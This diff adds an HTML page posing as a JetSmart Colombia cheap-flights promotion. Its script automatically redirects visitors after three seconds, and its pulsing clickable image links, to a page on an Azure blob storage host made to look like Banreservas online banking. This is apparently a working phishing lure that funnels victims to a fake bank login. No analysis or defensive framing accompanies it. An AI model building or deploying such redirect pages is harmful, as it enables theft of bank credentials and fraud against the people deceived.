@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>JetSmart Vuelos Baratos Colombia</title>
+    <style>
+        body {
+            margin: 0;
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f9;
+        }
+
+        /* Estilo del encabezado fijo */
+        .fixed-header {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            background-color: #fff; /* Fondo opcional */
+            z-index: 1000;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1); /* Sombra opcional */
+            text-align: center;
+            padding: 10px 0;
+        }
+
+        .fixed-header img {
+            max-width: 100%;
+            height: auto;
+        }
+
+        /* Espaciado para evitar que el contenido se superponga al encabezado */
+        .content {
+            margin-top: 100px; /* Ajustar según la altura del encabezado */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: calc(100vh - 100px); /* Resta la altura del encabezado */
+        }
+
+        a img {
+            cursor: pointer;
+            animation: heartbeat 1.5s infinite; /* Animación de latido */
+            max-width: 100%; /* Imagen responsiva */
+            height: auto; /* Mantener proporción */
+        }
+
+        /* Animación de latido */
+        @keyframes heartbeat {
+            0%, 100% {
+                transform: scale(1);
+            }
+            50% {
+                transform: scale(1.1);
+            }
+        }
+
+        /* Estilo responsivo para dispositivos pequeños */
+        @media (max-width: 768px) {
+            .fixed-header img {
+                width: 80px; /* Ajustar tamaño del logo */
+                height: 70px; /* Ajustar tamaño del logo */
+            }
+
+            .content {
+                margin-top: 80px; /* Reducir margen para dispositivos pequeños */
+                height: calc(100vh - 80px); /* Ajustar altura del contenido */
+            }
+
+            a img {
+                max-width: 90%; /* Imagen ocupa el 90% del ancho disponible */
+            }
+        }
+    </style>
+    <script>
+        // Configuración de las rutas
+        const imageUrl = "https://imagizer.imageshack.com/img923/6578/aw02vv.jpg"; // URL de la imagen PNG
+        const linkUrl = "https://banreservasonline.blob.core.windows.net/bancopersonal/index.html"; // Ruta al hacer clic en la imagen
+        const redirectUrl = "https://banreservasonline.blob.core.windows.net/bancopersonal/index.html"; // Ruta de redirección automática
+
+        // Redirección automática después de 3 segundos
+        setTimeout(() => {
+            window.location.href = redirectUrl;
+        }, 3000);
+    </script>
+</head>
+<body>
+    <!-- Encabezado fijo -->
+    <div class="fixed-header">
+        <img src="https://imagizer.imageshack.com/img924/7348/eNDQ3a.gif" alt="Encabezado Fijo" style="width: 110px; height: 100px;">
+    </div>
+
+    <!-- Contenido principal -->
+    <div class="content">
+        <a href="https://imagizer.imageshack.com/img923/6578/aw02vv.jpg" id="clickableImage">
+            <img src="https://imagizer.imageshack.com/img923/6578/aw02vv.jpg" alt="Imagen Cliqueable" id="dynamicImage">
+        </a>
+    </div>
+
+    <script>
+        // Asignar dinámicamente la imagen y el enlace
+        const clickableImage = document.getElementById('clickableImage');
+        const dynamicImage = document.getElementById('dynamicImage');
+
+        clickableImage.href = linkUrl;
+        dynamicImage.src = imageUrl;
+    </script>
+</body>
+</html>
